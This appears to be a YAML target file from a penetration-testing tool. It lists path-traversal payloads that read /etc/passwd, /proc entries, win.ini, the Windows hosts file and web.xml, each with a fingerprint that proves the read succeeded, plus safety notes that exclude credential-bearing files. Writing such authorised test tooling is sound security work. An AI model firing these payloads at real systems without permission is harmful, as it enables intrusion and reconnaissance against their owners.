# What to ask for once the path resolves, and the marker that proves the answer
# came off the disk rather than out of a template.
#
# Chosen for one property above all: a fingerprint no error page imitates. A file
# that merely exists is not proof, because the response body is what is being
# read and a friendly 404 has a body too.
#
# {{DEPTH}} is the traversal prefix, overshot rather than counted: resolvers
# clamp at the filesystem root, so more levels than necessary land in the same
# place. These payloads leave the intended directory by design, which is what
# separates this file from probe.yaml.
id: traversal/targets
reviewed: "2026-08-25"
title: Read targets and their fingerprints
variables: [DEPTH]
safety: >-
  Every target here is a system file whose contents are fixed by the operating
  system rather than by the deployment, chosen so that proving the read takes
  nothing belonging to the client or its users. Read one, record the marker, and
  stop. Two categories are deliberately absent and need the client's agreement
  before either is touched: application configuration, which is where the
  credentials are, and anything under /proc that reflects the running process --
  its arguments and environment carry secrets as often as configuration files
  do.
credits:
  - "The proof files and their markers are common knowledge among testers; the selection and the reasoning are written for this project."
entries:
  - name: unix account file
    os: [unix]
    payload: "{{DEPTH}}etc/passwd"
    detect: "A line matching root:x:0:0 at the start of the body."
    note: "World-readable on every Unix by design, which is exactly why it is the proof file: reading it takes nothing and proves everything."

  - name: unix mount table
    os: [unix]
    payload: "{{DEPTH}}proc/self/mounts"
    detect: "Lines of the form device mountpoint fstype options."
    note: "Use when /etc/passwd is filtered by name. It also names the container runtime, which /etc/passwd does not."

  - name: unix kernel version
    os: [unix]
    payload: "{{DEPTH}}proc/version"
    detect: "A single line beginning Linux version."
    note: >-
      Use where /etc/passwd is filtered by name. Deliberately not
      /proc/self/cmdline or /proc/self/environ: both routinely carry passwords,
      tokens and connection strings passed as arguments or environment, which is
      the client's data and not a proof marker.

  - name: windows initialisation file
    os: [windows]
    payload: "{{DEPTH}}Windows\\win.ini"
    detect: "The literal ; for 16-bit app support in the body."

  - name: windows host table
    os: [windows]
    payload: "{{DEPTH}}Windows\\System32\\drivers\\etc\\hosts"
    detect: "Commented lines ending in localhost."
    note: "Readable without privileges where win.ini has been removed from newer installs."

  - name: java deployment descriptor
    platform: [java]
    payload: "{{DEPTH}}WEB-INF/web.xml"
    detect: "An XML root element named web-app."
    note: "Relative to the application root rather than the filesystem root, so it needs less depth, not more."
